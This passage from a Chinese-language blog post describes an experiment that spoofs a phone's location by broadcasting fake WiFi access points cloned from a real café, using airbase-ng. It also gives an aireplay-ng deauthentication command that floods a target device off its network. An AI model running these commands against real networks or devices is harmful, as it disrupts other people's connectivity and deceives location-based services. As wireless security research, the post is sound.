+GPS 是手機接受到衛星訊號算出所在位置。
+基地台定位主要是根據手機基地台來決定手機位置，可以透過 <a href="https://developers.google.com/maps/documentation/business/geolocation/#cell_tower_object">Google Maps Geolocation API</a> 把基地台 LAC、CID 等資訊丟去查詢，會得到經緯度資訊。或是<a href="http://www.minigps.net/map.html">這裡</a>直接有介面可以查詢：</p>
+
+<blockquote><p>參考輸入：
+MCC: 466 (Taiwan)
+MNC: 92 (Chungwa)  其他 MCC、MNC 資訊可以上 <a href="http://en.wikipedia.org/wiki/List_of_mobile_country_codes">wikipedia</a> 查詢
+LAC、CID 資訊如果是 android 手機可以在撥打電話介面輸入『 * # * # 4 6 3 6 # * # * 』；
+iphone 手機可以在撥打電話介面輸入『 * 3 0 0 1 # 1 2 3 4 5 # * 』查看</p></blockquote>
+
+<p>wifi 定位是利用附近 WiFi access point 的資訊(主要是 MAC)，去資料庫比對查詢這些 AP 所在位置，並根據 AP 訊號的強弱，推算出手持裝置的位置。同樣的我們也可以用 <a href="https://developers.google.com/maps/documentation/business/geolocation/#cell_tower_object">Google Maps Geolocation API</a> 查詢：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="err">#</span> <span class="err">POST</span> <span class="err">以下</span> <span class="err">AP</span> <span class="err">資訊</span> <span class="err">(json</span> <span class="err">format)，是在台電大樓附近抓到的網路資訊</span>
+</span><span class='line'><span class="err">#</span> <span class="err">至</span> <span class="err">https://www.googleapis.com/geolocation/v</span><span class="mi">1</span><span class="err">/geolocate?key=API_KEY</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>   <span class="nt">&quot;wifiAccessPoints&quot;</span><span class="p">:[</span>
+</span><span class='line'>      <span class="p">{</span>
+</span><span class='line'>         <span class="nt">&quot;macAddress&quot;</span><span class="p">:</span><span class="s2">&quot;78:cd:8e:a6:--:--&quot;</span><span class="p">,</span>
+</span><span class='line'>         <span class="nt">&quot;signal&quot;</span><span class="p">:</span><span class="mi">-67</span>
+</span><span class='line'>      <span class="p">},</span>
+</span><span class='line'>      <span class="p">{</span>
+</span><span class='line'>         <span class="nt">&quot;macAddress&quot;</span><span class="p">:</span><span class="s2">&quot;ce:5d:4e:eb:--:--&quot;</span><span class="p">,</span>
+</span><span class='line'>         <span class="nt">&quot;signal&quot;</span><span class="p">:</span><span class="mi">-87</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>   <span class="p">]</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Google 會回傳</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="p">{</span>
+</span><span class='line'>   <span class="nt">&quot;location&quot;</span><span class="p">:{</span>
+</span><span class='line'>      <span class="nt">&quot;lat&quot;</span><span class="p">:</span><span class="mf">25.0184355</span><span class="p">,</span>
+</span><span class='line'>      <span class="nt">&quot;lng&quot;</span><span class="p">:</span><span class="mf">121.5305968</span>
+</span><span class='line'>   <span class="p">},</span>
+</span><span class='line'>   <span class="nt">&quot;accuracy&quot;</span><span class="p">:</span><span class="mf">150.0</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>
+回傳的經緯度的位置在<a href="https://maps.google.com.tw/maps?q=25.0184355,+121.5305968">這邊</a>，其實離我抓取 AP 資訊的位置非常非常近呢！</p>
+
+<p>如果<strong>今天我們想要偽造自己的真實地理位置</strong>，最有效的方法，應該是偽造外部的訊號：偽造衛星訊號、偽造基地台訊號或者偽造 WiFi 訊號，讓手機抓到這些訊號後以為自己是在別的地方。我明瞭透過軟體可以直接修改位置，市面上也有很多程式可以做到，但這些程式多半是利用手機 MockLocations 的機制，許多應用程式會去禁止這些行為。所以，基於研究精神，想要去探討是否有其他可以偽造位置的方式。</p>
+
+<h1>假設</h1>
+
+<p>如同前面所提到，我們需要偽造外部訊號，這可能需要一些硬體裝置。上網查了一下 GPS Signal Generator 一台就是上萬塊，嗯&hellip;跳過；要偽造基地台訊號，好像也沒有什麼頭緒(領域不熟)。唯一看起來比較可行的似乎就是從 wifi AP 著手了，而且從上面 Google API query 發現，雖然文件中對 AP 描述的參數很多，但實際上只要丟 macAddress 就可以很準確定位了。所以我猜測，如果手機定位也是這般單純的話，收集其他地方的 AP mac address，並且利用 google API 測試這些 mac address 可以正確查詢到經緯度，用這些 mac address 建幾個假 AP，就能夠成功偽造所在地理位置！</p>
+
+<p>沒想到在 survey 這條路的時候，發現 2008 年已經有人做過一樣的研究 (<a href="http://www.syssec.ch/press/location-spoofing-attacks-on-the-iphone-and-ipod">iPhone and iPod Location Spoofing Attacks</a>)！非常的鉅細靡遺，這篇文章簡單來說，要達成這樣的欺騙，只需要符合兩個條件：</p>
+
+<ol>
+<li>偽造目的地 AP 環境 (MAC address 符合即可)，另外這些 MAC address 必須要能夠從資料庫查詢到，不管是 APPLE, Goole, Skyhook 的 wifi 地理位置資料庫。</li>
+<li>消除目前手機接收到的所有 wifi 訊號，透過發送假訊號塞爆(jam)連線。</li>
+</ol>
+
+
+<p>OKay！照著這兩條準則實驗看看囉 :p</p>
+
+<h1>驗證</h1>
+
+<h2>偽造 AP</h2>
+
+<p>原本的研究用了另外的硬體設備去偽造，似乎有些麻煩。這邊我只用了一張網卡，用軟體控制網卡發送 beacons 封包，一張網卡就可以偽造多個 AP。
+使用的軟體是好朋友 airbase-ng，其實也只下了三行指令偽造了三台 AP，是前兩天去台電大樓伯朗咖啡抓來的 AP 資訊</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="err">airbase-ng</span> <span class="err">-c</span> <span class="err">&lt;頻道&gt;</span> <span class="err">-e</span> <span class="err">&lt;欲偽造的</span> <span class="err">ESSID&gt;</span> <span class="err">-a</span> <span class="err">&lt;欲偽造的</span> <span class="err">BSSID&gt;</span> <span class="err">&lt;網卡&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">airbase-ng</span> <span class="err">-c</span> <span class="mi">11</span> <span class="err">-e</span> <span class="s2">&quot;TPE-Free Bus&quot;</span> <span class="err">-a</span> <span class="err">d</span><span class="mi">8</span><span class="err">:c</span><span class="mi">7</span><span class="err">:c</span><span class="mi">8</span><span class="err">:</span><span class="mi">78</span><span class="err">:--:--</span> <span class="err">wlan</span><span class="mi">2</span>
+</span><span class='line'><span class="err">airbase-ng</span> <span class="err">-c</span> <span class="mi">6</span> <span class="err">-e</span> <span class="err">WIFLY</span> <span class="err">-a</span> <span class="mi">78</span><span class="err">:cd:</span><span class="mi">8</span><span class="err">e:a</span><span class="mi">6</span><span class="err">:--:--</span> <span class="err">wlan</span><span class="mi">2</span>
+</span><span class='line'><span class="err">airbase-ng</span> <span class="err">-c</span> <span class="mi">1</span> <span class="err">-e</span> <span class="s2">&quot;CHT Wi-Fi(HiNet)&quot;</span> <span class="err">-a</span> <span class="err">ce:</span><span class="mi">5</span><span class="err">d:</span><span class="mi">4</span><span class="err">e:eb:--:--</span> <span class="err">wlan</span><span class="mi">2</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>建立好 AP 後，手機上就可以多偵測到三台 SSID 為 TPE-Free Bus、WIFLY、CHT Wi-Fi(HiNet) 的 AP。直接打開 google map，竟然已經在台電大樓旁邊的伯朗咖啡了，距離實際所在地直線距離約六公里 LOL</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/18715/eKjWlvv6R06iyqJxFYDb_Screenshot_2013-07-13-19-35-55.png" alt="Screenshot_2013-07-13-19-35-55.png" /></p>
+
+<h2>消除其他 AP 訊號</h2>
+
+<p>由於這次實驗的地方是在高樓，其他 AP 訊號本來就比較薄弱，所以直接偽造目的地 AP 就可以成功改變地理位置。
+對於怎樣讓手機不要掃到特定 AP 訊號這件事情，我實在沒有什麼特別想法，除非是拿硬體干擾，或是在手機包一圈能削弱無限訊號的材質，這些都有點麻煩。用了 wifi jammer 當關鍵字搜尋，大部分都是利用不斷發送 deauth 封包讓人不能連線，這個動作是能讓人連不到 AP 沒錯，但並不是讓裝置找不到 AP 訊號，那已經是應用層的攻擊而不是實體層的攻擊了。不過還是分享一下怎樣做到 deauth 的，用另一個好朋友 aireplay-ng：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="err">aireplay-ng</span> <span class="err">--deauth</span> <span class="err">&lt;次數&gt;</span> <span class="err">-o</span> <span class="mi">1</span> <span class="err">-a</span> <span class="err">&lt;AP</span> <span class="err">的</span> <span class="err">BSSID&gt;</span> <span class="err">-e</span> <span class="err">&lt;AP</span> <span class="err">的</span> <span class="err">SSID&gt;</span> <span class="err">-c</span> <span class="err">&lt;手持裝置的BSSID&gt;</span> <span class="err">mon</span><span class="mi">0</span>
+</span><span class='line'><span class="err">ex:</span>
+</span><span class='line'><span class="err">aireplay-ng</span> <span class="err">--deauth</span> <span class="mi">9999999</span> <span class="err">-o</span> <span class="mi">1</span> <span class="err">-a</span> <span class="mi">11</span><span class="err">:</span><span class="mi">22</span><span class="err">:</span><span class="mi">33</span><span class="err">:</span><span class="mi">44</span><span class="err">:</span><span class="mi">55</span><span class="err">:</span><span class="mi">66</span> <span class="err">-e</span> <span class="err">targetAP</span> <span class="err">-c</span> <span class="mi">77</span><span class="err">:</span><span class="mi">88</span><span class="err">:</span><span class="mi">99</span><span class="err">:</span><span class="mi">00</span><span class="err">:aa:bb</span> <span class="err">mon</span><span class="mi">0</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>
+雖然不太方便消除原本的 AP 訊號，但經過測試，<strong>放多一點偽造 AP</strong> 還是可以成功欺騙的，例如目前手機能夠接受到三個正常 AP 訊號，我們就偽造五六七八個目的地 AP 訊號。這點可以利用 Google Maps Geolocation API 證實，丟五個目的地 AP 資訊和三個真實地 AP 資訊，最後回傳的地點是目的地的經緯度，多數決 :)。而且通常偽造的 AP 訊號都會比較強(你應該是坐在網卡旁邊做實驗吧XD)，多少也造成了欺騙的成功率。</p>
+
+<h1>結論</h1>
+
+<p>本篇目的是為了證實是否可以透過偽造假 AP 的方式，改變手持裝置的地理位置。經過簡單的實驗發現的確能做到這樣的事情，雖然成功的條件稍嫌嚴苛(現在很少 AP 訊號很少的地方了吧！)，可能要到樓頂阿或是操場正中央啦！不過還是可以透過偽造多一點 AP 來達成。也許有些人會問為什麼要這麼麻煩做這些事情？一來純研究，二來對某些瘋狂的人來說，這個結果可能會是寶貝吧:p</p>
+
+<p>其實對於真實地理位置欺騙這件事情，心中還有幾個想法，所以標題放了(1)，那就期待接下來 shaolin&rsquo;s 20% time 有沒有做出什麼成果囉！希望能成功，下次見XD</p>
 ]]></content>
   </entry>
   
